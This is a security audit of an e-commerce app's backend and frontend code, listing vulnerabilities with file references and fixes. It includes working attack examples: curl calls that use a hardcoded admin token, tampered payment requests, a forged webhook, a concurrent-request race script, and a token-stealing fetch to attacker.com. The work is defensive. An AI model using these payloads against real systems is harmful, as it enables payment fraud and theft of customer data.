# Chipzo E-Commerce Security Analysis
### A Deep Technical Audit of Your Actual Codebase

> **Scope:** This analysis is based on direct code inspection of every file in `server/src/` and `Chipzo-Web-main/src/`. Every vulnerability cited includes the exact file and line number in your code.

---

## ⚡ Executive Summary — Critical Vulnerabilities (Fix These First)

| # | Vulnerability | Severity | File | Lines |
|---|---|---|---|---|
| 1 | **Hardcoded admin backdoor** — `admin-secret-token` bypasses all auth | 🔴 CRITICAL | `auth.middleware.js` | L23–31 |
| 2 | **Admin credentials in frontend source** — `admin123` hardcoded in React | 🔴 CRITICAL | `AuthContext.jsx` | L47–55 |
| 3 | **Price trusted from client in `verifyPayment`** — `item.price` from `cartSnapshot` used without DB re-check | 🔴 CRITICAL | `payment.controller.js` | L78 |
| 4 | **`totalAmount` accepted from client** — if `cartSnapshot.totalAmount` is provided, it's used directly | 🔴 CRITICAL | `payment.controller.js` | L54 |
| 5 | **No inventory check at order time** — stock never decremented or validated | 🔴 CRITICAL | `cart.service.js`, `payment.controller.js` | — |
| 6 | **Webhook endpoints have zero authentication** — Shiprocket/Borzo webhooks accept any POST | 🔴 CRITICAL | `webhook.routes.js` | L13, 21 |
| 7 | **Dev signature bypass leakable to production** — `mock_` prefix bypasses crypto verification | 🔴 HIGH | `payment.service.js` | L46–52 |
| 8 | **No coupon system = future risk if added naively** — no coupon validation architecture exists | 🟡 MEDIUM | — | — |
| 9 | **JWT stored in `localStorage`** — vulnerable to XSS token theft | 🟡 MEDIUM | `AuthContext.jsx`, `api.js` | L4 |
| 10 | **Rate limiter is IP-only** — bypassed by rotating proxies | 🟡 MEDIUM | `rateLimiter.middleware.js` | — |

---

## Part 1 — Understanding Client-Side Manipulation

Before diving into your specific vulnerabilities, this section explains *how* attackers manipulate requests, because the same mental model applies to every vulnerability below.

### How HTTPS Does NOT Protect You

HTTPS encrypts the *channel* between the browser and server. It protects against a third party (on the same café Wi-Fi, for example) reading or modifying traffic. It does **not** protect against the user themselves modifying their own requests — because the user is *both* endpoints.

Think of it this way: HTTPS is like a sealed envelope. It prevents postal workers from reading the letter. But the sender can write whatever they want inside.

### Attack Toolkit — How Attackers Modify Requests

**1. Browser DevTools (Zero setup required)**

Every browser ships with a debugger more powerful than most developers realize.

- **Network tab → Copy as fetch/curl**: Right-click any request in the Network tab → "Copy as fetch". Paste into Console. Modify any field. Hit Enter. The backend has no idea it wasn't the React app that sent it.
- **Console injection**: `fetch('/api/orders', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + localStorage.getItem('chipzo_token') }, body: JSON.stringify({ address: {...}, cartSnapshot: [{ productId: '...', price: 0.01, quantity: 1 }] }) })` — this bypasses all UI controls.
- **Application tab → localStorage**: Your token is stored at `chipzo_token`. An attacker can see it, copy it, and use it from any machine.

**2. Proxy Tools (Burp Suite / OWASP ZAP / mitmproxy)**

These tools sit between the browser and the internet. Even though the connection is HTTPS, the browser must decrypt before handing it to the proxy. The attacker configures their browser to trust the proxy's certificate.

**Concrete example against Chipzo:**
1. Attacker opens Checkout page normally
2. Burp intercepts `POST /api/payment/verify`
3. Modifies `cartSnapshot[0].price` from `450` to `1`
4. Forwards the request
5. Backend creates order with ₹1 total ← **this is your current behavior**

**3. API Clients (Postman / curl)**

Attackers don't even need the UI. Once they know the API shape (from looking at minified JS or sniffing one real request), they can script arbitrary requests:

```bash
curl -X POST https://api.chipzo.in/api/payment/verify \
  -H "Authorization: Bearer eyJ..." \
  -H "Content-Type: application/json" \
  -d '{
    "razorpay_order_id": "order_ABC",
    "razorpay_payment_id": "pay_REAL",
    "razorpay_signature": "VALID_SIG",
    "address": { ... },
    "cartSnapshot": [{ "productId": "REAL_ID", "price": 0.01, "quantity": 999 }]
  }'
```

**Key insight:** The backend can only know what the attacker told it. It cannot distinguish "this came from our React app" from "this came from curl". The only trustworthy source is what the *server itself computed*.

---

## Part 2 — Attack Scenarios Against Chipzo

### 🔴 Attack 1: Price Manipulation via `cartSnapshot`

**Setup:** User has Arduino Uno (₹450) in cart. Razorpay order was already created for ₹450.

**Attack Steps:**
1. User goes through checkout normally
2. Razorpay SDK opens, user pays ₹450 (legitimate payment)
3. Razorpay returns `razorpay_order_id`, `razorpay_payment_id`, `razorpay_signature` to the browser handler
4. **The handler in `Checkout.jsx` (line 359–370) builds `cartSnapshot` from the local cart state**
5. Attacker modifies this in-flight using Burp Suite before it hits `/api/payment/verify`

**Attacker's modified request body:**
```json
{
  "razorpay_order_id": "order_NLeg5eXRhTM1L9",
  "razorpay_payment_id": "pay_PzMhT3kRWuVAbC",
  "razorpay_signature": "a3b1...(valid)",
  "address": { ... },
  "cartSnapshot": [
    {
      "productId": "682abc123...",
      "name": "Arduino Uno R3",
      "price": 0.01,
      "quantity": 1
    }
  ]
}
```

**The Vulnerable Code ([`payment.controller.js` L78](file:///home/vinith/Desktop/chipzo-2/server/src/controllers/payment.controller.js#L70-L85)):**
```javascript
const price = item.price || item.priceAtPurchase || product.price || 0;
```

This line first checks `item.price` (which came from the client), then falls back to `product.price` from the DB. An attacker who sends `price: 0.01` will get that price recorded in the order.

**The `totalAmount` problem ([`payment.controller.js` L54](file:///home/vinith/Desktop/chipzo-2/server/src/controllers/payment.controller.js#L46-L55)):**
```javascript
} else if (typeof cartSnapshot === 'object') {
    items = cartSnapshot.items || [];
    totalAmount = cartSnapshot.totalAmount || 0;  // ← TRUSTED FROM CLIENT
}
```
If the client sends `cartSnapshot` as an object with `totalAmount: 1`, the entire order is recorded for ₹1 — the signature verification doesn't prevent this because Razorpay only verifies that `order_id + payment_id` were signed with your secret. It does not verify the *amount* was actually charged.

**The `totalAmount` fallback ([`payment.controller.js` L87–90](file:///home/vinith/Desktop/chipzo-2/server/src/controllers/payment.controller.js#L87-L90)):**
```javascript
if (!totalAmount) {
    totalAmount = validatedItems.reduce((sum, item) => sum + item.price * item.quantity, 0);
}
```
Uses the already-poisoned `item.price` from the loop above.

**Financial Impact:** An attacker can purchase any item for ₹0.01. They paid the real amount to Razorpay (which your signature verifies), but the DB records a fraudulent price. You'd need manual reconciliation to catch this.

**The Fix:**
```javascript
// NEVER do this:
const price = item.price || product.price;

// ALWAYS do this:
const price = product.price; // product comes from DB lookup above
// Then compute total from DB prices only:
const serverTotal = validatedItems.reduce((sum, item) => sum + item.dbPrice * item.quantity, 0);
// Also verify against Razorpay's own record:
const rzpOrder = await razorpay.orders.fetch(razorpayOrderId);
if (Math.round(rzpOrder.amount) !== Math.round(serverTotal * 100)) {
    throw new ApiError(400, 'Amount mismatch. Payment amount does not match server total.');
}
```

---

### 🔴 Attack 2: Hardcoded Admin Backdoor

**The Vulnerable Code — Two Locations:**

**Location 1 ([`auth.middleware.js` L23–31](file:///home/vinith/Desktop/chipzo-2/server/src/middleware/auth.middleware.js#L22-L31)):**
```javascript
// MOCK ADMIN SYSTEM AUTHENTICATION
if (token === 'admin-secret-token') {
    req.user = {
        _id: '6a098ab765ecf83aaed0e000',
        name: 'System Admin',
        email: 'admin@chipzo.in',
        role: 'admin'
    };
    return next();  // ← Bypasses JWT verification entirely
}
```

**Location 2 ([`AuthContext.jsx` L47–55](file:///home/vinith/Desktop/chipzo-2/Chipzo-Web-main/Chipzo-Web-main/src/contexts/AuthContext.jsx#L47-L55)):**
```javascript
if ((normalizedEmail === 'admin' || normalizedEmail === 'admin@chipzo.in') && password === 'admin123') {
    const tok = 'admin-secret-token';
    // ...
}
```

**Attack:** This is trivial to exploit. The token `admin-secret-token` is:
1. **Hardcoded in the React source** — visible to anyone who opens DevTools → Sources and reads the minified JS
2. **Not a JWT** — it will never expire, cannot be rotated, and bypasses all normal auth
3. **Grants full admin access** — access to `GET/PUT/DELETE /api/orders/admin/*`, all product management

```bash
curl -X GET https://api.chipzo.in/api/orders/admin \
  -H "Authorization: Bearer admin-secret-token"
# Returns ALL customer orders, addresses, payment IDs
```

**The Fix:**
- Remove this backdoor entirely from both files
- Create a real admin user in the DB with `role: 'admin'`
- Admin login goes through the same JWT flow as any other user
- The `adminOnly` middleware in `order.routes.js` already works correctly — it checks `req.user.role === 'admin'`

```javascript
// In auth.middleware.js — DELETE lines 22-31
// In AuthContext.jsx — DELETE lines 47-55

// To create an admin: in MongoDB, update user document:
// db.users.updateOne({ email: 'admin@chipzo.in' }, { $set: { role: 'admin' } })
// User schema needs a `role` field added
```

---

### 🔴 Attack 3: Inventory Bypass — No Stock Checking

Your entire codebase has **zero inventory validation** at order time.

**In [`cart.service.js` addToCart (L38–73)](file:///home/vinith/Desktop/chipzo-2/server/src/services/cart.service.js#L38-L73):**
```javascript
const product = await Product.findById(productId);
if (!product) throw new ApiError(404, 'Product not found');
// ← No check for product.in_stock or product.stock
// ← No check for stock > quantity
```

**In [`payment.controller.js` (L62–85)](file:///home/vinith/Desktop/chipzo-2/server/src/controllers/payment.controller.js#L62-L85):**
```javascript
const products = await Product.find({ _id: { $in: productIds } });
// Verifies product exists, but:
// ← No check for in_stock flag
// ← No decrement of stock
// ← No race condition protection
```

**Attack Scenario:**
1. Product has `stock: 1`, `in_stock: true`
2. Two users simultaneously reach the payment verification stage for the same product
3. Both requests pass the (non-existent) stock check
4. Both orders are created successfully
5. You've oversold: 2 orders for 1 unit

**Race Condition Exploit (deliberate):**
```python
import asyncio, httpx

async def buy(client, token, order_id, pay_id, sig, cart):
    return await client.post('/api/payment/verify',
        headers={'Authorization': f'Bearer {token}'},
        json={'razorpay_order_id': order_id, 'razorpay_payment_id': pay_id,
              'razorpay_signature': sig, 'cartSnapshot': cart, 'address': {...}}
    )

# Send 50 concurrent requests for the same item
async def main():
    async with httpx.AsyncClient(base_url='https://api.chipzo.in/api') as client:
        tasks = [buy(client, ...) for _ in range(50)]
        results = await asyncio.gather(*tasks)
```

**The Fix — Atomic MongoDB Operation:**
```javascript
// In payment.controller.js, after signature verification:
for (const item of validatedItems) {
    const updated = await Product.findOneAndUpdate(
        {
            _id: item.productId,
            in_stock: true,
            stock: { $gte: item.quantity }  // Condition: enough stock
        },
        {
            $inc: { stock: -item.quantity }  // Atomic decrement
        },
        { new: true }
    );
    if (!updated) {
        throw new ApiError(409, `Insufficient stock for product: ${item.name}`);
    }
}
// IMPORTANT: All stock decrements should be in a MongoDB transaction
// so that a failure mid-loop doesn't leave partial decrements
```

---

### 🔴 Attack 4: Webhook Spoofing (Shiprocket + Borzo)

**The Vulnerable Code ([`webhook.routes.js` L13, 21](file:///home/vinith/Desktop/chipzo-2/server/src/routes/webhook.routes.js)):**
```javascript
router.post('/shiprocket', webhookController.shiprocketWebhook);
router.post('/borzo', webhookController.borzoWebhook);
// ← Zero authentication. Literally any POST request is accepted.
```

The `webhook.routes.js` file itself includes the comment: *"No auth required — Shiprocket signs requests, but for now it's open."* This is acknowledged but unimplemented.

**Attack:** An attacker discovers your webhook endpoint (via the Network tab of the Borzo integration, or simply by guessing `/api/webhook/borzo`) and sends a fake payload:

```bash
curl -X POST https://api.chipzo.in/api/webhook/borzo \
  -H "Content-Type: application/json" \
  -d '{
    "event_type": "delivery_changed",
    "order": { "order_id": "12345" },
    "delivery": { "status": "delivered", "is_completed": true }
  }'
```

If `handleBorzoWebhook` marks orders as delivered based on this, attackers can:
- Mark their order as delivered without it actually arriving (potentially triggering auto-refund denial)
- Manipulate delivery status for other users' orders
- Cause operational confusion in your fulfillment team

**The Fix — Shiprocket (HMAC):**
```javascript
const crypto = require('crypto');

const verifyShiprocketSignature = (req, res, next) => {
    const signature = req.headers['x-shiprocket-signature'];
    const payload = JSON.stringify(req.body);
    const expected = crypto
        .createHmac('sha256', process.env.SHIPROCKET_WEBHOOK_SECRET)
        .update(payload)
        .digest('hex');
    if (!crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(expected))) {
        return res.status(401).json({ message: 'Invalid webhook signature' });
    }
    next();
};
```

**The Fix — Borzo (IP Allowlist):**
```javascript
// Borzo publishes their static outbound IPs in their docs
const BORZO_IPS = ['185.245.88.0/24']; // Get from Borzo docs

const allowBorzoIPs = (req, res, next) => {
    const ip = req.ip || req.connection.remoteAddress;
    if (!BORZO_IPS.some(range => isInRange(ip, range))) {
        return res.status(403).json({ message: 'Forbidden' });
    }
    next();
};
```

---

### 🔴 Attack 5: IDOR — Accessing Another User's Order

**The Current State ([`order.service.js` L76–82](file:///home/vinith/Desktop/chipzo-2/server/src/services/order.service.js#L76-L82)):**
```javascript
const getOrderById = async (orderId, userId) => {
    const order = await Order.findOne({ _id: orderId, userId }).lean();
    if (!order) throw new ApiError(404, 'Order not found');
    return order;
};
```

✅ `getOrder` (user-facing) correctly scopes by `userId` — **this is correctly protected**.

**However, the admin endpoint ([`order.controller.js` L147–157](file:///home/vinith/Desktop/chipzo-2/server/src/controllers/order.controller.js#L147-L157)):**
```javascript
const getOrderAdmin = asyncHandler(async (req, res) => {
    const order = await Order.findById(req.params.id)
        .populate('userId', 'name email')
        .lean();
    // ...
});
```

The admin route does **not** validate input on `req.params.id`. A malformed `id` will hit MongoDB and throw an error. This is handled by the CastError handler in error middleware, which is correct. However, consider that:
1. The hardcoded backdoor (`admin-secret-token`) means **any attacker who knows this string can call admin endpoints**
2. `GET /api/orders/admin/:id` with a known order ID exposes all customer data including address, phone, and payment IDs

---

### 🟡 Attack 6: Dev Bypass Mode in Production

**The Vulnerable Code ([`payment.service.js` L46–52](file:///home/vinith/Desktop/chipzo-2/server/src/services/payment.service.js#L44-L52)):**
```javascript
const verifySignature = ({ razorpayOrderId, razorpayPaymentId, razorpaySignature }) => {
    // Development bypass for easy manual/Postman testing with mock signatures
    if (
        env.NODE_ENV === 'development' &&
        (razorpaySignature === 'signature_xxx' || razorpaySignature.startsWith('mock_'))
    ) {
        logger.warn('[Payment] ⚠️ DEV BYPASS: Skipping signature verification for mock signature.');
        return true;
    }
```

**The risk:** This is conditioned on `NODE_ENV === 'development'`, which is correct. However:
1. If your production server is misconfigured and `NODE_ENV` is not set to `'production'`, this bypass is active
2. The `.env.example` has `NODE_ENV=development` as the default — if a developer deploys without changing this, the bypass is live

**The Fix:**
```javascript
// REMOVE the bypass entirely. For testing in dev, use Razorpay's test mode.
// Razorpay provides test key pairs (rzp_test_*) that work with real signature generation.
// There is NO legitimate reason to skip signature verification, even in development.
```

---

### 🟡 Attack 7: JWT Stored in `localStorage` — XSS Risk

**The Vulnerable Code ([`api.js` L4](file:///home/vinith/Desktop/chipzo-2/Chipzo-Web-main/Chipzo-Web-main/src/services/api.js#L3-L5)):**
```javascript
function resolveToken() {
    return localStorage.getItem('chipzo_token');
}
```

**([`AuthContext.jsx` L50, 62](file:///home/vinith/Desktop/chipzo-2/Chipzo-Web-main/Chipzo-Web-main/src/contexts/AuthContext.jsx#L50-L64)):**
```javascript
localStorage.setItem('chipzo_token', tok)
localStorage.setItem('chipzo_user', JSON.stringify(usr)) // ← Also stores user object
```

**The problem:** Any JavaScript running on your page can read `localStorage`. If an attacker finds an XSS vector (even via a CDN, a third-party script like Razorpay SDK, or a future DOM-based XSS in your own code), they can steal the token:

```javascript
// Attacker's injected script
fetch('https://attacker.com/steal?t=' + localStorage.getItem('chipzo_token'))
```

The `admin-secret-token` is particularly dangerous here — it's also in `localStorage`.

**The Fix (for non-admin users — standard pattern):**
```javascript
// Store JWT in HttpOnly cookie instead:
// Backend sets:
res.cookie('chipzo_token', token, {
    httpOnly: true,    // Not readable by JS
    secure: true,      // HTTPS only
    sameSite: 'lax',   // CSRF protection
    maxAge: 7 * 24 * 60 * 60 * 1000
});
// Frontend makes requests with credentials: 'include'
// No token in localStorage at all
```

This requires CORS `credentials: true` (already configured in `app.js`) and the cookie approach.

---

## Part 3 — Frontend Security Analysis

### What an Attacker Can Read from Your Frontend

Every value in the browser is readable and modifiable. Here's what's exposed in Chipzo:

| Location | Data Stored | Risk |
|---|---|---|
| `localStorage.chipzo_token` | JWT bearer token | Complete account takeover if stolen via XSS |
| `localStorage.chipzo_user` | Full user object (name, email, role) | Role manipulation in frontend only (backend not affected, but user object shown to have `role: 'admin'` for the backdoor admin) |
| `localStorage.chipzo_cart` | Cart items with prices | Client-side only; no backend impact if server validates |
| React component state | `cart`, `subtotal`, `total`, `shipping` (Checkout.jsx L26–28) | Computed client-side but sent in `cartSnapshot` |
| Razorpay SDK `amount` param | Amount in paise | Cosmetic only — Razorpay SDK uses the amount from the Razorpay order, not what JS passes |

### Why Your Client-Side Validations Are Not Security Controls

In `Checkout.jsx`:
```javascript
// Line 49-68: runValidations checks:
// - Is it Sunday?
// - Is it within operating hours?
// - Is the city Bangalore?
```

These are **UX controls**, not security controls. An attacker can:
1. Not use the Checkout UI at all — call `POST /api/orders` directly with curl
2. Modify the JS in the browser console to bypass `checkSunday()` returning `true`
3. The backend's `order.validator.js` does NOT validate operating hours, day-of-week, or city restrictions

**These checks must also exist in the backend** if you intend them to be enforced.

Similarly, the quantity validation in `cart.validator.js` (`min: 1`) prevents negative quantities at the validator level, which is correct. But there's no maximum — someone could add `quantity: 999999` and your stock check (once implemented) must handle this.

---

## Part 4 — Backend Validation: What's Missing

Here is every validation check that *should* happen at `POST /api/payment/verify` and its current status:

| Check | Required | Current Status |
|---|---|---|
| JWT valid + user exists | ✅ | Implemented (auth middleware) |
| Product exists in DB | ✅ | Implemented (L62–68) |
| Product `in_stock` flag | ❌ | **MISSING** |
| Product `stock > quantity` | ❌ | **MISSING** |
| Price from DB (not client) | ❌ | **BROKEN** — uses `item.price` first |
| Total computed from DB prices | ❌ | **BROKEN** — uses client `totalAmount` if provided |
| Amount matches Razorpay order | ❌ | **MISSING** — no `razorpay.orders.fetch()` |
| Signature cryptographically valid | ✅ | Implemented |
| Duplicate `paymentId` check | ✅ | Implemented |
| Duplicate `razorpayOrderId` check | ✅ | Implemented |
| `razorpayOrderId` belongs to THIS user | ❌ | **MISSING** |
| Cart belongs to THIS user | ❌ | **MISSING** — relies on JWT `userId` but doesn't re-verify cart items |
| Inventory decremented atomically | ❌ | **MISSING** |
| No coupon double-spend | N/A | No coupon system exists |

---

## Part 5 — Payment Security Deep Dive

### Your Current Razorpay Flow

```
[Frontend]                              [Backend]
    |                                       |
    |-- POST /api/orders -----------------> |
    |   { address }                         |
    |                                       |-- cartService.computeTotal(cart)
    |                                       |   (uses DB prices ✅)
    |                                       |-- razorpay.orders.create({ amount })
    |<-- { razorpayOrderId, amount, key} ---|
    |                                       |
    |-- (Razorpay SDK opens) ------------> Razorpay
    |<-- { orderId, paymentId, sig }------- Razorpay
    |                                       |
    |-- POST /api/payment/verify ---------> |
    |   { orderId, paymentId, sig,          |-- verifySignature() ✅
    |     cartSnapshot, address }           |-- BUT uses prices from cartSnapshot ❌
    |                                       |-- No amount verification with Razorpay ❌
    |<-- { order } ----------------------- |
```

### The Missing Step: Verifying Amount with Razorpay

The signature only proves that Razorpay signed `orderId + paymentId`. It does **not** prove the amount. An attacker can:
1. Pay ₹1 to Razorpay (create a real order for ₹1, pay it, get a real signature)
2. Submit the real signature to your `/api/payment/verify` with a `cartSnapshot` that contains ₹10,000 of items
3. Your signature verification passes (the signature is real)
4. Your order is created for ₹1 (from the cartSnapshot)

**OR alternatively:**
1. Pay ₹1 to Razorpay for a real order
2. Submit the real signature with `cartSnapshot.totalAmount = 1` and items totaling ₹10,000
3. The `if (!totalAmount)` branch (L88) is NOT reached because `totalAmount = 1` was provided
4. Order created for ₹1, items worth ₹10,000

**The complete secure verification:**
```javascript
// After verifySignature():

// Step 1: Fetch the actual order from Razorpay
const rzpOrder = await razorpay.orders.fetch(razorpayOrderId);

// Step 2: Verify the order belongs to THIS user
// Store userId in Razorpay order's 'notes' field during creation:
// razorpay.orders.create({ amount, currency, notes: { userId: userId.toString() } })
// Then check: rzpOrder.notes.userId === req.user._id.toString()

// Step 3: Compute server-side total from DB prices only
const serverTotal = validatedItems.reduce(
    (sum, item) => sum + item.dbPrice * item.quantity, 0
);

// Step 4: Verify Razorpay amount matches server total
const expectedPaise = Math.round(serverTotal * 100);
if (rzpOrder.amount !== expectedPaise) {
    throw new ApiError(400,
        `Payment amount mismatch. Expected ₹${serverTotal}, gateway has ₹${rzpOrder.amount / 100}`
    );
}

// Step 5: Verify payment is captured (not just authorized)
const rzpPayment = await razorpay.payments.fetch(razorpayPaymentId);
if (rzpPayment.status !== 'captured') {
    throw new ApiError(400, 'Payment was not successfully captured.');
}
if (rzpPayment.order_id !== razorpayOrderId) {
    throw new ApiError(400, 'Payment does not belong to this order.');
}
```

---

## Part 6 — Inventory & Race Condition Security

### Why Your Current Approach Is Always Vulnerable

The current flow (once you add stock checks) will likely look like this:

```javascript
// VULNERABLE — even with stock check:
const product = await Product.findById(productId);
if (product.stock < quantity) throw error;          // CHECK
await Product.findByIdAndUpdate(productId,           // USE (separate operation)
    { $inc: { stock: -quantity } });
```

Between `findById` (CHECK) and `findByIdAndUpdate` (USE), another request can run and decrement the stock. This is a classic TOCTOU (Time-of-Check to Time-of-Use) race condition.

### The Correct Pattern — Atomic Operation

```javascript
// SAFE — condition and decrement are atomic:
const updated = await Product.findOneAndUpdate(
    {
        _id: item.productId,
        in_stock: true,
        stock: { $gte: item.quantity }          // Condition checked atomically
    },
    {
        $inc: { stock: -item.quantity },         // Decrement in same operation
        $set: { in_stock: true }                 // Optionally update in_stock if stock > 0
    },
    { new: true }                               // Return updated doc
);

if (!updated) {
    // Either product doesn't exist, or out of stock at this moment
    throw new ApiError(409, `Insufficient stock for: ${item.name}`);
}

// After decrement, check if now out of stock
if (updated.stock === 0) {
    await Product.findByIdAndUpdate(item.productId, { $set: { in_stock: false } });
}
```

### Multi-Document Transactions (Critical for Order Creation)

Order creation touches multiple documents: the Order document and multiple Product documents (stock decrement). If one product's stock decrement fails after another product's was already applied, you have inconsistent data.

```javascript
const mongoose = require('mongoose');

// In payment.controller.js verifyPayment:
const session = await mongoose.startSession();
try {
    await session.withTransaction(async () => {
        // 1. Decrement stock for all items
        for (const item of validatedItems) {
            const updated = await Product.findOneAndUpdate(
                { _id: item.productId, stock: { $gte: item.quantity } },
                { $inc: { stock: -item.quantity } },
                { session, new: true }
            );
            if (!updated) {
                throw new Error(`Insufficient stock: ${item.name}`);
            }
        }
        // 2. Create order document (inside same transaction)
        order = await orderService.createOrder({ ..., session });
        // 3. Clear cart
        await cartService.clearCart(req.user._id, session);
    });
} finally {
    await session.endSession();
}
```

---

## Part 7 — API Security Analysis

### Authentication: The Backdoor Problem

Your JWT implementation is otherwise solid:
- ✅ bcrypt with 12 rounds for passwords
- ✅ Token fetched from `Authorization: Bearer` header
- ✅ User existence verified in DB after JWT decode
- ✅ `timingSafeEqual` used in signature verification
- ❌ `JWT_EXPIRES_IN=7d` — tokens never revoked on logout (logout only clears localStorage)
- ❌ No refresh token pattern — 7-day tokens are long-lived

**The logout problem:** When a user "logs out", only `localStorage` is cleared. The JWT itself remains valid for up to 7 days. If it was stolen before logout, it still works.

**Fix (token denylist — simplest approach):**
```javascript
// Add to User schema:
invalidatedBefore: { type: Date, default: null }

// On logout:
await User.findByIdAndUpdate(userId, { invalidatedBefore: new Date() });

// In auth.middleware.js after decode:
if (user.invalidatedBefore && decoded.iat * 1000 < user.invalidatedBefore.getTime()) {
    throw new ApiError(401, 'Session invalidated. Please log in again.');
}
```

### Rate Limiting: Current Gaps

Your current rate limiters ([`rateLimiter.middleware.js`](file:///home/vinith/Desktop/chipzo-2/server/src/middleware/rateLimiter.middleware.js)):
- `generalLimiter`: 100 req / 15 min (IP-based)
- `authLimiter`: 10 req / 15 min (IP-based)

**Issues:**
1. **IP-based only** — Cloudflare proxies, VPNs, or attacker-controlled botnets can rotate IPs
2. **No per-user rate limiting** — once logged in, a user can hammer order endpoints 100 times per 15 minutes
3. **OTP brute-force** — `forgotPassword` generates 6-digit OTPs (1,000,000 combinations). At 10 attempts per 15 minutes (from different IPs), a brute-force is feasible
4. **No rate limit on cart manipulation** — Cart endpoints can be hammered to cause DB load

**Fix — Add user-based limiting:**
```javascript
const createUserLimiter = (windowMinutes, max, message) => 
    rateLimit({
        windowMs: windowMinutes * 60 * 1000,
        max,
        keyGenerator: (req) => req.user?._id?.toString() || req.ip,
        handler: (req, res, next) => next(new ApiError(429, message)),
    });

// Apply to order placement:
const orderLimiter = createUserLimiter(60, 5, 'Too many orders placed. Wait 1 hour.');
router.post('/', protect, orderLimiter, validate(createOrderSchema), orderController.initiateOrder);
```

### Mass Assignment Protection

Your signup controller ([`auth.controller.js` L25–35](file:///home/vinith/Desktop/chipzo-2/server/src/controllers/auth.controller.js#L25-L35)):
```javascript
const user = await User.create({
    name,
    email,
    password,
    phone,
    city,
    isVerified: true,   // ← Hardcoded, not from req.body ✅
    otp: null,
    otpExpiresAt: null,
    otpLastSentAt: null,
});
```

The User model does NOT have a `role` field in its schema — so mass assignment of `role: 'admin'` via the signup endpoint would simply be ignored by Mongoose (it only persists schema-defined fields). This is actually good.

However, the `updateProfile` controller ([`auth.controller.js` L98–124](file:///home/vinith/Desktop/chipzo-2/server/src/controllers/auth.controller.js#L98-L124)):
```javascript
const { name, phone, currentPassword, newPassword } = req.body;
if (name !== undefined) user.name = name;
if (phone !== undefined) user.phone = phone;
```
This correctly whitelists fields — ✅ good pattern.

### Input Validation Gaps

Your validators use Joi and are well-structured. However:

1. **`payment.controller.js` has NO Joi schema** — `cartSnapshot`, `address` fields are used directly from `req.body` without schema validation at the route level. The payment route only does `protect`:
   ```javascript
   router.post('/verify', protect, paymentController.verifyPayment);
   // ← No validate() middleware
   ```

2. **`order.validator.js` addressSchema uses `.unknown(true)`** — this allows any extra fields to pass through validation:
   ```javascript
   }).unknown(true);  // ← Should be false to reject unknown fields
   ```

3. **Admin endpoints have no input schema** — `PUT /api/orders/admin/:id` accepts `paymentStatus`, `deliveryStatus`, `deliveryTrackingId` but doesn't validate that these are valid enum values before the `findByIdAndUpdate` call with `runValidators: true`. The `runValidators` flag helps, but schema-level rejection is cleaner.

---

## Part 8 — Database Security

### What You've Done Well

- ✅ `express-mongo-sanitize` is configured in `app.js` — prevents `$where`, `$gt` injection in query params
- ✅ Mongoose schemas enforce field types — a string where a number is expected will be rejected
- ✅ Indexed `paymentId` and `razorpayOrderId` — fast idempotency checks
- ✅ `select: false` on password field in User schema
- ✅ Error handler strips passwords from error responses

### Gaps

1. **No MongoDB transactions** — as noted in the inventory section, multi-document updates are not atomic
2. **No audit log collection** — payment events, status changes, and admin actions are logged to Winston but not to the database. If your log files are lost, the audit trail is gone.
3. **`specifications` field is `Mixed` type** — [`Product.js` L64](file:///home/vinith/Desktop/chipzo-2/server/src/models/Product.js#L62-L64). `Mixed` type bypasses Mongoose validation. Any object can be stored here. This is fine for legitimate use, but ensure this field is never read back and executed (no `eval`, no dynamic query generation from it).

---

## Part 9 — Business Logic Security

### The Shipping Fee Is Client-Computed

**In `Checkout.jsx` (L27–28):**
```javascript
const shipping = subtotal >= 100 ? 0 : 9.99;
const total = subtotal + shipping;
```

**In `order.controller.js` — `initiateOrder`:**
```javascript
const totalAmount = cartService.computeTotal(cart.items);
// ← computeTotal does NOT add shipping
```

**In `cart.service.js` `computeTotal` (L134–140):**
```javascript
const computeTotal = (items = []) =>
    items.reduce((total, item) => {
        if (item.productId && typeof item.productId === 'object') {
            return total + (item.productId.price || 0) * item.quantity;
        }
        return total;
    }, 0);
```

**The actual amount sent to Razorpay:** `cartService.computeTotal(cart.items)` — this is the product subtotal only, **without shipping**.

**The amount the user sees:** `subtotal + shipping` (on the checkout page).

**For orders under ₹100:** The user is shown `subtotal + 9.99` but charged `subtotal` only. This might be intentional (free shipping as a promo) but it's inconsistent — and if you ever need to enforce shipping fees server-side, the infrastructure doesn't exist.

**Recommendation:** Add shipping computation to the backend:
```javascript
const computeShipping = (subtotal) => subtotal >= 100 ? 0 : 9.99;
const totalAmount = cartService.computeTotal(cart.items) + computeShipping(subtotal);
```

### Order Cancellation Without Inventory Restoration

When `deleteOrderAdmin` is called, the order is deleted but inventory is not restored:
```javascript
const order = await Order.findByIdAndDelete(req.params.id);
// ← No stock restoration
```

For a cancelled/deleted order where stock was decremented (once you add stock management), you'd need to restore the stock.

---

## Part 10 — Real-World Attack Walkthroughs

### Walkthrough A: Full Price Manipulation

**Setup:** Arduino Uno R3 priced at ₹450. Attacker wants it for ₹1.

**Step 1 — Attacker sets up Burp Suite as browser proxy**

**Step 2 — Attacker adds item to cart, proceeds to checkout normally. Checkout page POSTs to `/api/orders` and gets a valid Razorpay order:**
```json
{ "razorpayOrderId": "order_ABC123", "amount": 450, "currency": "INR" }
```

**Step 3 — Razorpay SDK opens. Attacker pays ₹1** using a separate Razorpay test order they created for ₹1. They get:
```json
{
  "razorpay_order_id": "order_1RUPEE",
  "razorpay_payment_id": "pay_PAID1",
  "razorpay_signature": "VALID_SIG_FOR_1_RUPEE"
}
```

**Step 4 — Burp intercepts the `/api/payment/verify` request. Attacker modifies it:**
```json
{
  "razorpay_order_id": "order_1RUPEE",
  "razorpay_payment_id": "pay_PAID1",
  "razorpay_signature": "VALID_SIG_FOR_1_RUPEE",
  "address": { ... },
  "cartSnapshot": {
    "items": [{ "productId": "REAL_ARDUINO_ID", "name": "Arduino Uno R3", "price": 1, "quantity": 1 }],
    "totalAmount": 1
  }
}
```

**Step 5 — Backend behavior:**
1. Finds product in DB ✅
2. Uses `item.price = 1` from client ❌
3. `totalAmount = 1` (from client) ❌
4. Verifies signature of `order_1RUPEE + pay_PAID1` — valid ✅
5. Creates Order with `totalAmount: 1`
6. Clears cart

**Financial impact:** ₹449 loss per transaction. With the hardcoded admin bypass also available, attacker could then check all customer orders to see what the fraud pattern looks like.

**The fix:** Use only `product.dbPrice` for price computation, verify amount with `razorpay.orders.fetch()`, reject if mismatch.

---

### Walkthrough B: Admin Backdoor Exploitation

